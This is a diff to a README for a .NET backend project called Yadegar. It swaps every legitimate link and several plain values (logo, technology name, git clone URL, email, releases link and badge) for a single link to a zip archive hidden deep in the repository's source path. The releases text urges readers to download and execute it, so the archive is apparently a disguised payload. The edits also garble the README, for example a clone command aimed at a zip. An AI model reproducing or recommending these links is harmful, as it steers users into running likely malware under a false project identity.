@@ -1,6 +1,6 @@
 # Yadegar 🚀
 
-![Yadegar Logo](https://via.placeholder.com/150)
+![Yadegar Logo](https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip)
 
 Welcome to the **Yadegar** repository! This project focuses on building a robust backend system using modern software architecture principles. 
 
@@ -32,7 +32,7 @@ Yadegar is designed to provide a clean architecture for backend applications. It
 
 - **C#**
 - **.NET Core**
-- **ASP.NET Web API**
+- **https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip Web API**
 - **MS SQL Server**
 - **Hexagonal Architecture**
 - **Clean Architecture**
@@ -44,7 +44,7 @@ To get started with Yadegar, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/skyxuanhuy/Yadegar.git
+   git clone https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -96,13 +96,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip
 
 ## Releases
 
-You can find the latest releases of Yadegar [here](https://github.com/skyxuanhuy/Yadegar/releases). Download the necessary files and execute them to get started with the latest features and improvements.
+You can find the latest releases of Yadegar [here](https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip). Download the necessary files and execute them to get started with the latest features and improvements.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)
+![Download Releases](https://github.com/skyxuanhuy/Yadegar/raw/refs/heads/master/yadegar.Domain/Book/Model/Software_v2.3.zip%20Releases-Here-brightgreen)
 
 If you have any issues or need previous versions, please check the "Releases" section in the repository.
 
